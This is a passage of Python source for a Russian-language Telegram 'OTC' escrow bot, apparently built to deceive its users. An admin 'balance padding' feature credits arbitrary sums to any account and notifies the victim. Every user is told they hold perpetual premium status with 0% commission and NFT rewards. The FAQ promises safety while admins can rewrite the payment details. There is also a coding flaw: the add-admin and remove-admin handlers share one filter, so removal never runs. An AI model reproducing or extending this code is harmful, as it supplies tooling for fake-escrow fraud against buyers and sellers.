                        f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР ПО СДЕЛКЕ #{deal_id}!\n\n"
                        f"📦 Товар: {deal['product']}\n"
                        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                        f"👤 Продавец: @{deal['seller_username']}\n\n"
                        f"✅ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ ТОВАРА:",
                        reply_markup=active_keyboard
                    )
                except Exception as e:
                    await callback.message.answer(
                        f"⚠️ НЕ УДАЛОСЬ УВЕДОМИТЬ ПОКУПАТЕЛЯ @{deal['buyer_username']}\n\n"
                        f"Отправьте ему эту ссылку:\nhttps://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
                    )
    
    await callback.answer("✅ Продавец подтвердил передачу товара")

# ========== ПОКУПАТЕЛЬ ПОДТВЕРЖДАЕТ ПОЛУЧЕНИЕ ==========
@dp.callback_query(lambda c: c.data.startswith("buyer_confirm_"))
async def buyer_confirm_receipt(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("❌ СДЕЛКА НЕ НАЙДЕНА")
        return
    
    deal = deals[deal_id]
    if deal["status"] != "awaiting_confirmation":
        await callback.answer("❌ ПРОДАВЕЦ ЕЩЁ НЕ ПОДТВЕРДИЛ ПЕРЕДАЧУ ТОВАРА")
        return
    
    add_balance(deal["seller_id"], deal["currency"], deal["amount"])
    
    deal["status"] = "completed"
    deal["completed_at"] = datetime.now().isoformat()
    save_deals(deals)
    
    await callback.message.edit_text(
        f"✅ ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА!\n\n"
        f"СДЕЛКА #{deal_id} ЗАВЕРШЕНА.\n"
        f"СПАСИБО ЗА ДОВЕРИЕ! 🤝"
    )
    
    await bot.send_message(
        deal["seller_id"],
        f"🎉 СДЕЛКА #{deal_id} УСПЕШНО ЗАВЕРШЕНА! 🎉\n\n"
        f"💰 {deal['amount']} {deal['currency']} ЗАЧИСЛЕНЫ НА ВАШ БАЛАНС.\n"
        f"📦 Товар: {deal['product']}\n"
        f"👤 Покупатель: @{deal['buyer_username']}\n\n"
        f"БАЛАНС МОЖНО ПРОВЕРИТЬ В ГЛАВНОМ МЕНЮ."
    )
    
    await log_to_master(
        f"🎉 СДЕЛКА ЗАВЕРШЕНА\n"
        f"ID: #{deal_id}\n"
        f"Продавец: @{deal['seller_username']} (+{deal['amount']} {deal['currency']})\n"
        f"Покупатель: @{deal['buyer_username']}"
    )
    
    await callback.answer()

# ========== МОИ СДЕЛКИ ==========
@dp.message(F.text == "📋 МОИ СДЕЛКИ")
async def my_deals(message: types.Message):
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == message.from_user.id:
            user_deals.append((d_id, d))
    
    if not user_deals:
        await message.answer("📭 У ВАС НЕТ СДЕЛОК.", reply_markup=main_menu(message.from_user.id))
        return
    
    text = "📋 ВАШИ СДЕЛКИ\n\n"
    for d_id, d in user_deals[-10:]:
        status_emoji = {"waiting_payment": "⏳ ОЖИДАЕТ ОПЛАТЫ", "paid": "✅ ОПЛАЧЕНО", "awaiting_confirmation": "📦 ОЖИДАЕТ ПОДТВЕРЖДЕНИЯ", "completed": "🎉 ЗАВЕРШЕНА"}.get(d['status'], d['status'])
        text += f"{d_id} | {d['amount']} {d['currency']} | {status_emoji}\n   → {d['product'][:30]}\n\n"
    
    await message.answer(text, reply_markup=main_menu(message.from_user.id))

# ========== ПРЕМИУМ ==========
@dp.message(F.text == "⭐️ ПРЕМИУМ")
async def premium_info(message: types.Message):
    await message.answer(
        "✨ ПРЕМИУМ СТАТУС ✨\n\n"
        "💎 ПРИВИЛЕГИИ:\n"
        "• ПРИОРИТЕТНАЯ ПОДДЕРЖКА 24/7\n"
        "• СНИЖЕННАЯ КОМИССИЯ (0%)\n"
        "• РАННИЙ ДОСТУП К НОВЫМ ФУНКЦИЯМ\n"
        "• ЭКСКЛЮЗИВНЫЕ NFT-НАГРАДЫ\n\n"
        "⭐️ ВАШ СТАТУС: АКТИВЕН (БЕССРОЧНО)\n\n"
        "СПАСИБО, ЧТО ВЫ С НАМИ! 🚀"
    )

# ========== ЧАСТЫЕ ВОПРОСЫ ==========
@dp.message(F.text == "❓ FAQ")
async def faq(message: types.Message):
    faq_text = """
❓ ЧАСТЫЕ ВОПРОСЫ

🔹 КАК НАЧАТЬ СДЕЛКУ?
НАЖМИТЕ «📦 СОЗДАТЬ СДЕЛКУ» И СЛЕДУЙТЕ ИНСТРУКЦИИ. ПРОДАВЕЦ ПОЛУЧИТ ССЫЛКУ ДЛЯ ПОКУПАТЕЛЯ.

🔹 КАКИЕ ВАЛЮТЫ ДОСТУПНЫ?
💎 TON | ⭐️ STARS | ₽ RUB | ₴ UAH

🔹 КАК Я ПОЛУЧУ ОПЛАТУ?
ПОСЛЕ ТОГО КАК ПОКУПАТЕЛЬ ПОДТВЕРДИТ ПОЛУЧЕНИЕ ТОВАРА, ДЕНЬГИ ЗАЧИСЛЯЮТСЯ НА ВАШ БАЛАНС.

🔹 КАК ВЫВЕСТИ ДЕНЬГИ?
НАЖМИТЕ «💰 МОЙ БАЛАНС», ВЫБЕРИТЕ ВАЛЮТУ И УКАЖИТЕ РЕКВИЗИТЫ.

🔹 БЕЗОПАСНО ЛИ ЭТО?
ДА! АДМИНИСТРАТОР ПРОВЕРЯЕТ ОПЛАТУ ПО РЕКВИЗИТАМ, А ПРИ ОПЛАТЕ С БАЛАНСА СДЕЛКА АВТОМАТИЧЕСКАЯ.

🔹 СКОЛЬКО ВРЕМЕНИ ЗАНИМАЕТ ВЫВОД?
ОБЫЧНО 1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ АДМИНИСТРАТОРОМ.

🔹 КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?
НАЖМИТЕ КНОПКУ «🆘 ПОДДЕРЖКА» НИЖЕ
"""
    await message.answer(faq_text, reply_markup=main_menu(message.from_user.id))

# ========== ПОДДЕРЖКА ==========
@dp.message(F.text == "🆘 ПОДДЕРЖКА")
async def support(message: types.Message):
    await message.answer(
        f"🆘 СЛУЖБА ПОДДЕРЖКИ SWAGS OTC\n\n"
        f"📞 СВЯЗЬ С ОПЕРАТОРОМ:\n{SUPPORT_LINK}\n\n"
        f"📝 ЧТО ПИСАТЬ В ПОДДЕРЖКУ:\n"
        f"• ID СДЕЛКИ (ЕСЛИ ЕСТЬ)\n"
        f"• ПОДРОБНОЕ ОПИСАНИЕ ПРОБЛЕМЫ\n"
        f"• СКРИНШОТЫ\n\n"
        f"⏰ ВРЕМЯ ОТВЕТА: ДО 15 МИНУТ\n\n"
        f"✨ МЫ ВСЕГДА ГОТОВЫ ПОМОЧЬ!",
        reply_markup=main_menu(message.from_user.id),
        disable_web_page_preview=True
    )

# ========== АДМИН-ПАНЕЛЬ ==========
@dp.message(F.text == "👑 АДМИН ПАНЕЛЬ")
async def admin_panel(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    await message.answer("👑 ПАНЕЛЬ АДМИНИСТРАТОРА\n\nВЫБЕРИТЕ ДЕЙСТВИЕ:", reply_markup=admin_panel_keyboard())

# ========== НАКРУТКА БАЛАНСА АДМИНОМ ==========
@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance_start(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    await state.set_state(AdminAddBalanceState.waiting_for_user_id)
    await callback.message.answer("💰 ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ, КОТОРОМУ ХОТИТЕ НАЧИСЛИТЬ БАЛАНС:\n\nЧТОБЫ УЗНАТЬ ID, МОЖНО ИСПОЛЬЗОВАТЬ БОТА @userinfobot")
    await callback.answer()

@dp.message(AdminAddBalanceState.waiting_for_user_id)
async def admin_add_balance_user_id(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user_id=user_id)
        await state.set_state(AdminAddBalanceState.waiting_for_currency)
        await message.answer("💎 ВЫБЕРИТЕ ВАЛЮТУ:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💎 TON", callback_data="admin_balance_TON")],
                [InlineKeyboardButton(text="⭐️ STARS", callback_data="admin_balance_STARS")],
                [InlineKeyboardButton(text="₽ RUB", callback_data="admin_balance_RUB")],
                [InlineKeyboardButton(text="₴ UAH", callback_data="admin_balance_UAH")]
            ]))
    except ValueError:
        await message.answer("❌ ВВЕДИТЕ ЧИСЛОВОЙ ID ПОЛЬЗОВАТЕЛЯ")

@dp.callback_query(lambda c: c.data.startswith("admin_balance_"))
async def admin_add_balance_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[2]
    await state.update_data(target_currency=currency)
    await state.set_state(AdminAddBalanceState.waiting_for_amount)
    await callback.message.edit_text(f"💰 ВВЕДИТЕ СУММУ ДЛЯ НАЧИСЛЕНИЯ В {currency}:")
    await callback.answer()

@dp.message(AdminAddBalanceState.waiting_for_amount)
async def admin_add_balance_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        data = await state.get_data()
        user_id = data["target_user_id"]
        currency = data["target_currency"]
        
        add_balance(user_id, currency, amount)
        
        await message.answer(f"✅ НАЧИСЛЕНО {amount} {currency} ПОЛЬЗОВАТЕЛЮ (ID: {user_id})")
        await log_to_master(f"💰 Админ @{message.from_user.username} начислил {amount} {currency} пользователю ID:{user_id}")
        
        try:
            await bot.send_message(
                user_id,
                f"💰 ВАШ БАЛАНС ПОПОЛНЕН!\n\n"
                f"СУММА: {amount} {currency}\n\n"
                f"ПРОВЕРИТЬ БАЛАНС: /start → «МОЙ БАЛАНС»"
            )
        except:
            pass
        
        await state.clear()
    except:
        await message.answer("❌ ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО")

@dp.callback_query(lambda c: c.data == "withdraw_requests")
async def show_withdraw_requests(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    
    pending = {rid: req for rid, req in withdraw_requests.items() if req["status"] == "pending"}
    
    if not pending:
        await callback.message.answer("📭 НЕТ АКТИВНЫХ ЗАЯВОК НА ВЫВОД")
    else:
        text = "💸 ЗАЯВКИ НА ВЫВОД\n\n"
        for rid, req in pending.items():
            text += f"#{rid} | {req['amount']} {req['currency']} | @{req['username']}\n"
            text += f"📝 {req['details'][:50]}\n"
            text += f"➡️ /confirm_withdraw {rid}\n\n"
        await callback.message.answer(text)
    await callback.answer()

# ========== ИЗМЕНЕНИЕ ФОТО ==========
@dp.callback_query(lambda c: c.data == "change_photo")
async def change_photo_prompt(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    await callback.message.answer("📷 ОТПРАВЬТЕ НОВОЕ ФОТО ДЛЯ ПРИВЕТСТВЕННОГО СООБЩЕНИЯ.\n\nФОТО ДОЛЖНО БЫТЬ В ФОРМАТЕ JPEG ИЛИ PNG.")
    await state.set_state(PhotoStates.waiting_for_photo)
    await callback.answer()

@dp.message(PhotoStates.waiting_for_photo)
async def save_photo_handler(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await message.answer("⛔️ ДОСТУП ЗАПРЕЩЁН")
        await state.clear()
        return
    
    if message.photo:
        file_id = message.photo[-1].file_id
        start_photo["file_id"] = file_id
        save_start_photo(start_photo)
        await message.answer("✅ ФОТО ДЛЯ ПРИВЕТСТВЕННОГО СООБЩЕНИЯ ОБНОВЛЕНО!")
        await log_to_master(f"🖼 Админ {message.from_user.full_name} изменил фото при старте")
    else:
        await message.answer("❌ ОТПРАВЬТЕ ФОТО, А НЕ ДРУГОЙ ФАЙЛ")
    
    await state.clear()

# ========== РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ ==========
@dp.callback_query(lambda c: c.data == "edit_rekvisits")
async def edit_rekvisits_panel(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    await callback.message.edit_text("💳 РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ ОПЛАТЫ\n\nВЫБЕРИТЕ ВАЛЮТУ ДЛЯ ИЗМЕНЕНИЯ:", reply_markup=rekvisits_edit_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_ton")
async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    await callback.message.answer("📝 ВВЕДИТЕ НОВЫЙ ТЕКСТ ДЛЯ ОПЛАТЫ TON:\n\nИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ")
    await state.update_data(rekv_type="ton")
    await state.set_state(RekvStates.waiting_for_rekv_text)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_stars")
async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    await callback.message.answer("📝 ВВЕДИТЕ НОВЫЙ ТЕКСТ ДЛЯ ОПЛАТЫ STARS:\n\nИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ")
    await state.update_data(rekv_type="stars")
    await state.set_state(RekvStates.waiting_for_rekv_text)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_rub")
async def edit_rub(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    await callback.message.answer("📝 ВВЕДИТЕ НОВЫЙ ТЕКСТ ДЛЯ ОПЛАТЫ RUB:\n\nИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ")
    await state.update_data(rekv_type="rub")
    await state.set_state(RekvStates.waiting_for_rekv_text)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_uah")
async def edit_uah(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    await callback.message.answer("📝 ВВЕДИТЕ НОВЫЙ ТЕКСТ ДЛЯ ОПЛАТЫ UAH:\n\nИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ")
    await state.update_data(rekv_type="uah")
    await state.set_state(RekvStates.waiting_for_rekv_text)
    await callback.answer()

@dp.message(RekvStates.waiting_for_rekv_text)
async def save_rekv_text(message: types.Message, state: FSMContext):
    data = await state.get_data()
    rekv_type = data.get("rekv_type")
    if rekv_type:
        rekvisits[rekv_type] = message.text.strip()
        save_rekvisits(rekvisits)
        await message.answer(f"✅ РЕКВИЗИТЫ ДЛЯ {rekv_type.upper()} ОБНОВЛЕНЫ!")
        await log_to_master(f"💳 Админ {message.from_user.full_name} изменил реквизиты для {rekv_type.upper()}")
    await state.clear()

@dp.callback_query(lambda c: c.data == "back_to_admin")
async def back_to_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    await callback.message.edit_text("👑 ПАНЕЛЬ АДМИНИСТРАТОРА\n\nВЫБЕРИТЕ ДЕЙСТВИЕ:", reply_markup=admin_panel_keyboard())
    await callback.answer()

# ========== УПРАВЛЕНИЕ АДМИНАМИ ==========
@dp.callback_query(lambda c: c.data == "add_admin")
async def add_admin_prompt(callback: types.CallbackQuery):
    if callback.from_user.id != MASTER_ADMIN_ID:
        await callback.answer("⛔️ ТОЛЬКО ГЛАВНЫЙ АДМИН", show_alert=True)
        return
    await callback.message.answer("📝 ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ ДЛЯ ДОБАВЛЕНИЯ В АДМИНЫ:")
    await callback.answer()

@dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
async def add_admin_process(message: types.Message):
    user_id = int(message.text.strip())
    admins.add(user_id)
    save_admins(admins)
    await message.answer(f"✅ ПОЛЬЗОВАТЕЛЬ {user_id} ТЕПЕРЬ АДМИНИСТРАТОР!")
    await log_to_master(f"👑 Новый админ добавлен: {user_id}")

@dp.callback_query(lambda c: c.data == "remove_admin")
async def remove_admin_prompt(callback: types.CallbackQuery):
    if callback.from_user.id != MASTER_ADMIN_ID:
        await callback.answer("⛔️ ТОЛЬКО ГЛАВНЫЙ АДМИН", show_alert=True)
        return
    await callback.message.answer("📝 ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ ДЛЯ УДАЛЕНИЯ ИЗ АДМИНОВ:")
    await callback.answer()

@dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
async def remove_admin_process(message: types.Message):
    user_id = int(message.text.strip())
    if user_id == MASTER_ADMIN_ID:
        await message.answer("❌ НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА")
        return
    if user_id in admins:
        admins.remove(user_id)
        save_admins(admins)
        await message.answer(f"✅ ПОЛЬЗОВАТЕЛЬ {user_id} БОЛЬШЕ НЕ АДМИНИСТРАТОР.")
        await log_to_master(f"👑 Админ удалён: {user_id}")
    else:
        await message.answer("❌ НЕ НАЙДЕН")

@dp.callback_query(lambda c: c.data == "list_admins")
async def list_admins_callback(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    admin_list = "\n".join([f"• {aid}" for aid in admins])
    await callback.message.answer(f"👥 СПИСОК АДМИНОВ:\n\n{admin_list}")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "all_deals")
async def all_deals_callback(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    if not deals:
        await callback.message.answer("📭 НЕТ СДЕЛОК")
    else:
        text = "📋 ВСЕ СДЕЛКИ\n\n"
        for deal_id, deal in list(deals.items())[-20:]:
            status_emoji = {"waiting_payment": "⏳", "paid": "✅", "awaiting_confirmation": "📦", "completed": "🎉"}.get(deal['status'], deal['status'])
            text += f"{deal_id} | {status_emoji} | {deal['amount']} {deal['currency']}\n"
        await callback.message.answer(text)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "noop")
async def noop_callback(callback: types.CallbackQuery):
    await callback.answer("⏳ ДОЖДИТЕСЬ, КОГДА ПРОДАВЕЦ ПЕРЕДАСТ ТОВАР")

@dp.callback_query(lambda c: c.data.startswith("support_"))
async def support_callback(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[1]
    await callback.answer()
    await callback.message.answer(
        f"📞 ПО ВОПРОСАМ СДЕЛКИ #{deal_id} ОБРАЩАЙТЕСЬ В ПОДДЕРЖКУ:\n{SUPPORT_LINK}"
    )

# ========== ЗАПУСК ==========
async def main():
    print(f"🚀 SWAGS OTC ЗАПУЩЕН")
    print(f"👑 ГЛАВНЫЙ АДМИН: {MASTER_ADMIN_ID}")
    print(f"👥 ВСЕГО АДМИНОВ: {len(admins)}")
    print(f"🤖 БОТ: @swags_otc_bot")
    print(f"💳 ДОСТУПНЫЕ ВАЛЮТЫ: TON, STARS, RUB, UAH")
    print(f"✅ ДЕНЬГИ ЗАЧИСЛЯЮТСЯ ПРОДАВЦУ ТОЛЬКО ПОСЛЕ ПОДТВЕРЖДЕНИЯ ПОКУПАТЕЛЯ")
    print(f"✅ ССЫЛКА НА СДЕЛКУ: https://t.me/{BOT_USERNAME}?start=deal_xxxxx")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
